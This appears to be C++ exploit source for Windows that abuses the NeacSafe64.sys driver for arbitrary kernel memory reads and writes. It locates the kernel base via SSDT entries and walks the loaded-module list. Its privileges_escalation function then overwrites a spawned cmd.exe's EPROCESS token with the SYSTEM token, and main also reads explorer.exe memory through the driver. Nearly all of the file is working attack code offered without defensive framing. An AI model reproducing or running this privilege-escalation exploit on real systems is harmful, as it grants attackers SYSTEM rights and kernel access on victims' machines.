
#include <iostream>

#include<windows.h>
#include"controller.h"
#include"service.h"

DWORD parse_export_rva(const BYTE* moduleBase, const char* funcName) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBase;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return 0;

    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(moduleBase + dosHeader->e_lfanew);
    IMAGE_DATA_DIRECTORY exportDirEntry = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (exportDirEntry.VirtualAddress == 0) return 0;

    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)(moduleBase + exportDirEntry.VirtualAddress);
    DWORD* nameRvas = (DWORD*)(moduleBase + exportDir->AddressOfNames);
    WORD* ordinals = (WORD*)(moduleBase + exportDir->AddressOfNameOrdinals);
    DWORD* funcRvas = (DWORD*)(moduleBase + exportDir->AddressOfFunctions);

    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        const char* name = (const char*)(moduleBase + nameRvas[i]);
        if (_stricmp(name, funcName) == 0) {
            WORD ordinal = ordinals[i];
            return funcRvas[ordinal];
        }
    }
    return 0;
}
DWORD get_export_rva(const char *funcName) {
    char system32Path[MAX_PATH];

    GetSystemDirectoryA(system32Path, MAX_PATH);

    std::string kernelPath = std::string(system32Path) + "\\ntoskrnl.exe";

    HANDLE hFile = CreateFileA(kernelPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return NULL;
    }

    HANDLE hMapping = CreateFileMapping(
        hFile, 
        NULL, 
        SEC_IMAGE | PAGE_READONLY,
        0, 0, 
        NULL
    );;
    if (!hMapping) {
        CloseHandle(hFile);
        return NULL;
    }
    const BYTE* fileBase = (const BYTE*)MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!fileBase) {
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return NULL;
    }

    DWORD rva = parse_export_rva(fileBase, funcName);
    UnmapViewOfFile(fileBase);

    CloseHandle(hMapping);
    CloseHandle(hFile);
    return rva;
}

PVOID SSDT_Items[0x1000];
HANDLE hPort;
PVOID find_krnl_images(PVOID PsLoadedModuleList, const wchar_t* name) {
    PVOID Ptr;
    kernel_read_data(hPort, &Ptr, PsLoadedModuleList, 8);
    WCHAR ModuleName[260] = {0};
    while(Ptr != PsLoadedModuleList) {
        memset(ModuleName, 0, sizeof(ModuleName));
        PVOID DllBase;
        kernel_read_data(hPort, &DllBase, (PBYTE)Ptr + 0x30, 8);

        USHORT NameSize;
        kernel_read_data(hPort, &NameSize, (PBYTE)Ptr + 0x58, 2);
        
        PVOID NameAddr;
        kernel_read_data(hPort, &NameAddr, (PBYTE)Ptr + 0x60, 8);

        kernel_read_data(hPort, &ModuleName, NameAddr, NameSize);
        if(!lstrcmpW(ModuleName, name)) {
            return DllBase;
        }
        kernel_read_data(hPort, &Ptr, Ptr, 8);
    }
    return NULL;
}


void privileges_escalation(PVOID KrnlBase) {
    DWORD va = get_export_rva("PsInitialSystemProcess");
    if(va == NULL) {
        return;
    }
    PVOID PsInitialSystemProcess = (PVOID)((PBYTE)KrnlBase + va);
    PVOID PsInitialSystemProcessEPROCESS;

    if(!kernel_read_data(hPort, &PsInitialSystemProcessEPROCESS, PsInitialSystemProcess, 8)) {
        printf("[!] fail to get PsInitialSystemProcess EPROCESS...\n");
        return;
    }
    printf("[+] PsInitialSystemProcess EPROCESS: %p\n", PsInitialSystemProcessEPROCESS);

     uintptr_t TokenOffset = 0x248; 
     uintptr_t PIDOffset = 0x1d0;
     uintptr_t ActiveProcessLinksOffset = 0x1d8; 

    PVOID SystemToken;
    if(!kernel_read_data(hPort, &SystemToken, (PBYTE)PsInitialSystemProcessEPROCESS + TokenOffset, 8)) {
        printf("[!] fail to get SystemToken.\n");
        return;
    }
    printf("[+] SystemToken: %p\n", SystemToken);

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi;
    CreateProcessA(
        "C:\\Windows\\system32\\cmd.exe",
        nullptr,
        nullptr,
        nullptr,
        TRUE,
        CREATE_NEW_CONSOLE,
        nullptr,
        "C:\\Windows",
        &si,
        &pi
    );
    DWORD OurShellPID = pi.dwProcessId;


    LIST_ENTRY activeProcessLinkList;
    uint64_t NextProcessEPROCESSBlock = (uint64_t)PsInitialSystemProcessEPROCESS;
    if(!kernel_read_data(hPort, &activeProcessLinkList, (PBYTE)PsInitialSystemProcessEPROCESS + ActiveProcessLinksOffset, sizeof(LIST_ENTRY))) {
        printf("[!] fail to get ActiveProcessLinks\n");
        return;
    }
    while (true) {
        DWORD processPID;
        NextProcessEPROCESSBlock = (uint64_t) activeProcessLinkList.Flink - ActiveProcessLinksOffset;
     

        if(!kernel_read_data(hPort, &processPID, (PBYTE)NextProcessEPROCESSBlock + PIDOffset, 4)) {
            printf("[!] fail to read memory\n");
            return;
        }
        if (processPID == OurShellPID) {

            PVOID OurShellsToken;
            if(!kernel_read_data(hPort, &OurShellsToken, (PBYTE)NextProcessEPROCESSBlock + TokenOffset, 8)) {
                printf("[!] fail to read Token..\n");
                return;
            }
            printf("[+] Token: %p\n", OurShellsToken);

            if(!kernel_write_data(hPort, (PBYTE)NextProcessEPROCESSBlock + TokenOffset, &SystemToken, 8)) {
                printf("[!] fail to write Token..\n");
                return;
            }
            printf("[+] Success...");
            break;
        }


        kernel_read_data(hPort, &activeProcessLinkList, (PBYTE)NextProcessEPROCESSBlock + ActiveProcessLinksOffset, sizeof(LIST_ENTRY));
    }
   
}
#include <tlhelp32.h>
DWORD find_explorer_pid() {
    DWORD pid = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };

    if (Process32First(snapshot, &processEntry)) {
        do {
            if (wcscmp(processEntry.szExeFile, L"explorer.exe") == 0) {
                pid = processEntry.th32ProcessID;
                break;
            }
        } while (Process32Next(snapshot, &processEntry));
    }
    CloseHandle(snapshot);
    return pid;
}

int main()
{
    start_driver();
    hPort = connect_driver();
    if(hPort == INVALID_HANDLE_VALUE) {
        printf("[!] fail to connect to driver\n");
    }
    get_ssdt_items(hPort, SSDT_Items, sizeof(SSDT_Items));
    DWORD rva = get_export_rva("NtWaitForSingleObject");
    if(rva == 0) {
        printf("[!] fail to get the rva of NtWaitForSingleObject\n");
        return 0;
    }
    if(SSDT_Items[4] == 0) {
        printf("[!] fail to get the address of NtWaitForSingleObject\n");
        return 0;
    }
    PVOID KrnlBase = (PVOID)((PBYTE)SSDT_Items[4] - rva);

    printf("[+] kernel module base address: %p\n", KrnlBase);

    rva = get_export_rva("PsLoadedModuleList");
    if(rva == 0) {
        printf("[!] fail to get the rva of PsLoadedModuleList\n");
        return 0;
    }
    PVOID PsLoadedModuleList = (PVOID)((PBYTE)KrnlBase + rva);
    PVOID NeacSafe64Base = find_krnl_images(PsLoadedModuleList, L"NeacSafe64.sys");
    if(!NeacSafe64Base) {
        printf("[!] fail to get the module base address of NeacSafe64.sys\n");
        return 0;
    }
    printf("[+] NeacSafe64.sys module base address: %p\n", NeacSafe64Base);

 
   

    DWORD explorerPid = find_explorer_pid();
    if (explorerPid != 0) {
        printf("[+] Found explorer.exe PID: %lu\n", explorerPid);

     
        PVOID explorerBase = get_proc_base(hPort, explorerPid);
        if (explorerBase) {
            printf("[+] Explorer base address: %p\n", explorerBase);

         
            BYTE buffer[15];
            if (read_proc_memory(hPort, explorerPid, explorerBase, sizeof(buffer), buffer)) {
                printf("[+] First 15 bytes: ");
                for (int i = 0; i < sizeof(buffer); i++) {
                    printf("%02X ", buffer[i]);
                }
                printf("\n");
            }
            else {
                printf("[!] Failed to read explorer memory\n");
            }
        }
        else {
            printf("[!] Could not get explorer base address\n");
        }
    }
    else {
        printf("[!] Could not find explorer.exe\n");
    }

    getchar();
    CloseHandle(hPort);
    stop_driver();
    return 0;

}